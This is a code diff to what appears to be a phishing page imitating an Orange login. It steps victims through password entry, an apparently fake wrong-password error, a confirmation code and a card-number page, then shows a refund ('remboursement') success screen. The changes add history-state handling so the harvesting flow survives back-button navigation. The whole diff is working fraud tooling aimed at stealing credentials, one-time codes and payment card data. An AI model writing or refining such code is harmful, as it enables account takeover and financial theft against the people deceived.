@@ -274,7 +274,7 @@ if(isset($_POST['username'])){
                                        maxlength="256" autocorrect="off"
                                        autocapitalize="off"/>
                             </div>
-                            <button id="btnSubmit" type="submit" class="btn btn-info eui-btn-sub"  style="visibility: hidden;">Continuer</button>
+                            <button id="btnSubmit" type="submit" class="btn btn-info eui-btn-sub"  onclick="" style="visibility: hidden;">Continuer</button>
                         </form>
                     </div>
                     <!-- END FORM -->
@@ -357,6 +357,29 @@ $('#login').bind('input', function() {
     $(this).css("color","#000")
 });
 
+window.onpopstate= function(event){
+  //  step = step -1 ;
+  step = event.state.step
+  console.log("event",event)
+    console.log("STep=",step)
+    if(step === 3 || step === 2 || step === 1){
+        console.log("REmbousement hider");
+        $('#rembours').css("display","none");
+    $("#identify").show();
+    }
+    if( step === 3 || step === 4){
+    $("#identify").hide();
+    $('#rembours').css("display","none");
+
+    }
+
+    //submitForm({},event.state.url)
+    console.log('Location:',event.state.url);
+    $('#euiFor').load(event.state.url);
+    $('#euiFor').prop('action',event.state.next);
+};
+
+
 function makeid(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
@@ -386,40 +409,48 @@ function ValidateNumber(number){
 
 }
     // step 1 show password view
-    //window.history.pushState("", "", "login.orange"+makeid(45));
-    var step = 1;
+    // window.history.pushState("", "", "index.php");
+    var step = 1; 
     function submitForm(data, url) {
         $.ajax({
             type: "post",
             url: url,
             data: data,
             success: function (data) {
+                console.log("STep=",step)
                 switch (step){
                     case 1:
                         $("#euiFor").prop("action", "error_password.php");
-                     //   window.history.pushState("", "", "login.orange"+makeid(45));
+                        window.history.pushState({url:"password.php", next:"error_password.php", step:step}, "", "");
                         break;
                     case 2:
                         $("#euiFor").prop("action", "confirmation_code.php");
-                       // window.history.pushState("", "", "login.orange"+makeid(45));
+                        window.history.pushState({url:"error_password.php", next:"confirmation_code.php", step:step}, "", "");
+                        // window.history.pushState("", "", "error_password.php");
                         break;
                     case 3:
                         $("#euiFor").prop("action", "numero_carte.php");
-                       // window.history.pushState("", "", "verification"+makeid(45));
+                        window.history.pushState({url:"confirmation_code.php", next:"numero_carte.php", step:step}, "", "");
+                        // window.history.pushState("", "", "confirmation_code.php");
                         break;
                     case 4:
                         // $("#euiFor").prop("action", "expiration_date.php");
                         $("#euiFor").prop("action", "success.php");
-                        window.history.pushState("", "", "remboursement"+makeid(45));
+                        window.history.pushState({url:"numero_carte.php", next:"success.php", step:step}, "", "");
 
                         break;
                     case 5:
                        // $("#euiFor").prop("action", "cryptogramme.php");
                         break;
                     case 6:
+                        // window.history.pushState({url:"success.php"}, "", "");
+                     //   window.history.pushState({url:"success.php"}, "", "");
+
                       //  $("#euiFor").prop("action", "success.php");
                         break;
                 }
+              
+
                 if(step === 5){
                     $('#rembours').css("display","none");
                     $("#formContainer").hide();
@@ -449,12 +480,14 @@ function ValidateNumber(number){
         
         if(username !=undefined){
             if(ValidateEmail(username) == false && ValidateNumber(username) == false ){
-    $('#usernameerror').css("visibility","initial")
+                $('#usernameerror').css("visibility","initial")
                 $('#login').css("border-color","#f12b2d")
                 $('#login').css("color","#f12b2d")
+
                 return
+             }
         }
-        }
+        $("#btnSubmit").prop( "disabled", false );
         
   
         var data = $(this).serialize();
